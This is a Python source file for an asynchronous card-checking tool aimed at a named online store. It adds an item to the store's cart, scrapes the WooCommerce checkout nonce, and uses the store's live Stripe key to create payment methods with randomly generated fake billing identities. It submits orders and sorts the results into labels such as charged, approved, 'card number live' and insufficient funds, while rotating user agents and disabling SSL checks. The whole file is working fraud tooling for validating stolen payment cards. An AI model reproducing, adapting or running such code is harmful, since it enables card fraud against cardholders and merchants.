import asyncio
import aiohttp
import random
import json
import re
import time
from typing import Tuple, Optional


class BeBiggyChecker:
    SITE = "https://bebiggy.com"
    PK = "pk_live_518FLNbBXQObsZWr3AbV1VRDGyJIBIDjHsgtoPkUdjoei2k7rMNGDqlbmlSEBISB9IE1QpMdIKU7qDYZgh6dMQmG300eatiSS1J"
    PRODUCT_ID = "29999"

    TOKEN_TTL = 300

    FIRST_NAMES = [
        "James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda",
        "David","Elizabeth","William","Barbara","Richard","Susan","Joseph","Jessica",
        "Thomas","Sarah","Charles","Karen","Christopher","Lisa","Daniel","Nancy",
    ]
    LAST_NAMES = [
        "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
        "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
        "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
    ]
    CITIES = [
        ("New York","NY","10001"),("Los Angeles","CA","90001"),("Chicago","IL","60601"),
        ("Houston","TX","77001"),("Phoenix","AZ","85001"),("Philadelphia","PA","19101"),
        ("San Diego","CA","92101"),("Dallas","TX","75201"),("Denver","CO","80201"),
        ("Portland","OR","97201"),("Seattle","WA","98101"),("Boston","MA","02101"),
        ("Miami","FL","33101"),("Atlanta","GA","30301"),("Austin","TX","73301"),
    ]
    STREETS = ["Main","Oak","Maple","Cedar","Elm","Pine","Birch","Walnut","Cherry",
               "Park","Lake","Hill","Forest","River","Spring","Sunset","Valley"]

    def __init__(self):
        self._ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        ]
        self._checkout_nonce: Optional[str] = None
        self._nonce_ts: float = 0
        self._jar: Optional[aiohttp.CookieJar] = None
        self._session: Optional[aiohttp.ClientSession] = None

    def _ua(self) -> str:
        return random.choice(self._ua_list)

    def _headers(self) -> dict:
        return {
            "User-Agent": self._ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }

    def _rand_identity(self) -> dict:
        first = random.choice(self.FIRST_NAMES)
        last = random.choice(self.LAST_NAMES)
        city, state, zipcode = random.choice(self.CITIES)
        street_num = random.randint(100, 9999)
        street = random.choice(self.STREETS)
        email = f"{first.lower()}{last.lower()}{random.randint(100,9999)}@protonmail.com"
        return {
            "first": first, "last": last, "email": email,
            "address": f"{street_num} {street} St",
            "city": city, "state": state, "zip": zipcode,
            "phone": f"{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}",
        }

    def invalidate_session(self):
        self._checkout_nonce = None
        self._nonce_ts = 0
        if self._session and not self._session.closed:
            asyncio.ensure_future(self._session.close())
        self._session = None
        self._jar = None

    async def _ensure_session(self) -> bool:
        now = time.time()
        if self._checkout_nonce and (now - self._nonce_ts) < self.TOKEN_TTL:
            return True

        try:
            if self._session and not self._session.closed:
                await self._session.close()

            self._jar = aiohttp.CookieJar(unsafe=True)
            self._session = aiohttp.ClientSession(cookie_jar=self._jar)

            await self._session.post(
                f"{self.SITE}/?add-to-cart={self.PRODUCT_ID}",
                data={"add-to-cart": self.PRODUCT_ID, "quantity": "1"},
                headers={**self._headers(), "Content-Type": "application/x-www-form-urlencoded"},
                ssl=False, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15),
            )

            async with self._session.get(
                f"{self.SITE}/checkout/",
                headers=self._headers(), ssl=False, timeout=aiohttp.ClientTimeout(total=15),
            ) as r:
                html = await r.text()

            nonce_match = re.findall(r'woocommerce-process-checkout-nonce.*?value=["\'](\w+)', html)
            if not nonce_match:
                return False

            self._checkout_nonce = nonce_match[0]
            self._nonce_ts = now
            return True
        except Exception:
            return False

    async def _create_pm(self, cc: str, mm: str, yy: str, cvv: str, identity: dict) -> Optional[Tuple[str, str]]:
        if not self._session:
            return None
        try:
            async with self._session.post(
                "https://api.stripe.com/v1/payment_methods",
                data={
                    "type": "card",
                    "card[number]": cc,
                    "card[exp_month]": mm.lstrip("0") or "1",
                    "card[exp_year]": yy,
                    "card[cvc]": cvv,
                    "billing_details[name]": f"{identity['first']} {identity['last']}",
                    "billing_details[email]": identity["email"],
                    "billing_details[address][line1]": identity["address"],
                    "billing_details[address][city]": identity["city"],
                    "billing_details[address][state]": identity["state"],
                    "billing_details[address][postal_code]": identity["zip"],
                    "billing_details[address][country]": "US",
                    "key": self.PK,
                },
                headers={"User-Agent": self._ua(), "Referer": "https://js.stripe.com/"},
                timeout=aiohttp.ClientTimeout(total=15),
            ) as r:
                resp = await r.json()
                if resp.get("error"):
                    return None
                pm_id = resp.get("id")
                brand = resp.get("card", {}).get("brand", "visa")
                return pm_id, brand
        except Exception:
            return None

    async def _submit_checkout(self, pm_id: str, brand: str, identity: dict) -> Optional[Tuple[str, str]]:
        if not self._session or not self._checkout_nonce:
            return None
        try:
            data = {
                "billing_first_name": identity["first"],
                "billing_last_name": identity["last"],
                "billing_country": "US",
                "billing_address_1": identity["address"],
                "billing_city": identity["city"],
                "billing_state": identity["state"],
                "billing_postcode": identity["zip"],
                "billing_phone": identity["phone"],
                "billing_email": identity["email"],
                "payment_method": "cpsw_stripe",
                "wc-cpsw_stripe-payment-token": "new",
                "payment_method_created": pm_id,
                "card_brand": brand,
                "selected_payment_type": "card",
                "woocommerce-process-checkout-nonce": self._checkout_nonce,
                "_wp_http_referer": "/checkout/",
            }

            async with self._session.post(
                f"{self.SITE}/?wc-ajax=checkout",
                data=data,
                headers={
                    **self._headers(),
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "XMLHttpRequest",
                },
                ssl=False, timeout=aiohttp.ClientTimeout(total=20),
            ) as r:
                resp = await r.json()

            result = resp.get("result", "")
            redirect = resp.get("redirect", "")

            if result != "success":
                msgs = resp.get("messages", "")
                clean = re.sub(r"<[^>]+>", " ", msgs).strip()
                return None

            match = re.findall(r"confirm-pi-(pi_\w+_secret_\w+)", redirect)
            if match:
                client_secret = match[0]
                pi_id = client_secret.split("_secret_")[0]
                return pi_id, client_secret

            if "order-received" in redirect:
                return "DIRECT_CHARGE", redirect

            return None
        except Exception:
            return None

    async def _confirm_pi(self, pi_id: str, client_secret: str, pm_id: str) -> Tuple[str, str]:
        if not self._session:
            return "ERROR", "No session"
        try:
            async with self._session.post(
                f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                data={
                    "payment_method": pm_id,
                    "client_secret": client_secret,
                    "key": self.PK,
                    "return_url": f"{self.SITE}/checkout/order-received/",
                },
                headers={"User-Agent": self._ua(), "Referer": "https://js.stripe.com/"},
                timeout=aiohttp.ClientTimeout(total=30),
            ) as r:
                resp = await r.json()
        except Exception as e:
            return "ERROR", str(e)

        status = resp.get("status", "")
        error = resp.get("error", {})
        last_error = resp.get("last_payment_error", {})

        if error:
            return self._classify_error(error)

        if status == "requires_action":
            return "APPROVED", "3DS/Authentication Required"

        if status == "succeeded":
            amount = resp.get("amount", 0)
            currency = resp.get("currency", "usd")
            return "CHARGED", f"Charged ${amount/100:.2f} {currency.upper()}"

        if status == "requires_capture":
            amount = resp.get("amount", 0)
            return "APPROVED", f"Authorized ${amount/100:.2f} (hold)"

        if last_error:
            return self._classify_error(last_error)

        return "UNKNOWN", f"Status: {status}"

    def _classify_error(self, error: dict) -> Tuple[str, str]:
        code = error.get("code", "")
        decline = error.get("decline_code", "")
        msg = error.get("message", "Unknown error")

        card_info = ""
        pm = error.get("payment_method", {})
        if pm:
            card = pm.get("card", {})
            brand = (card.get("brand") or "").upper()
            funding = card.get("funding", "")
            country = card.get("country", "")
            last4 = card.get("last4", "")
            card_info = f" | {brand} {funding} {country} ...{last4}"

        if decline == "authentication_required" or code == "authentication_required":
            return "APPROVED", f"3DS Required{card_info}"
        if decline == "insufficient_funds":
            return "INSUFFICIENT", f"Insufficient Funds{card_info}"
        if decline == "incorrect_cvc" or code == "incorrect_cvc":
            return "CCN", f"Incorrect CVC (card number live){card_info}"
        if decline in ("stolen_card", "lost_card", "pickup_card"):
            return "DECLINED", f"{decline}{card_info}"
        if decline == "do_not_honor":
            return "DECLINED", f"Do Not Honor{card_info}"
        if decline == "generic_decline":
            return "DECLINED", f"Generic Decline{card_info}"
        if decline == "card_not_supported":
            return "DECLINED", f"Card Not Supported{card_info}"
        if code == "incorrect_number":
            return "DECLINED", f"Invalid Card Number{card_info}"
        if code == "expired_card" or decline == "expired_card":
            return "DECLINED", f"Expired Card{card_info}"
        if code == "processing_error":
            return "ERROR", f"Processing Error{card_info}"

        return "DECLINED", f"{decline or code}: {msg}{card_info}"

    async def check_card(self, cc: str, mm: str, yy: str, cvv: str) -> Tuple[str, str]:
        for attempt in range(2):
            if not await self._ensure_session():
                if attempt == 0:
                    self.invalidate_session()
                    continue
                return "ERROR", "Failed to establish session"

            identity = self._rand_identity()

            pm_result = await self._create_pm(cc, mm, yy, cvv, identity)
            if not pm_result:
                return "DECLINED", "Invalid card data (PM creation failed)"

            pm_id, brand = pm_result

            checkout_result = await self._submit_checkout(pm_id, brand, identity)
            if not checkout_result:
                if attempt == 0:
                    self.invalidate_session()
                    continue
                return "ERROR", "Checkout submission failed"

            if checkout_result[0] == "DIRECT_CHARGE":
                return "CHARGED", "Direct charge (no PI confirmation)"

            pi_id, client_secret = checkout_result

            status, msg = await self._confirm_pi(pi_id, client_secret, pm_id)

            if status == "ERROR" and "nonce" in msg.lower():
                self.invalidate_session()
                continue

            self.invalidate_session()

            return status, msg

        return "ERROR", "Max retries exceeded"

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()
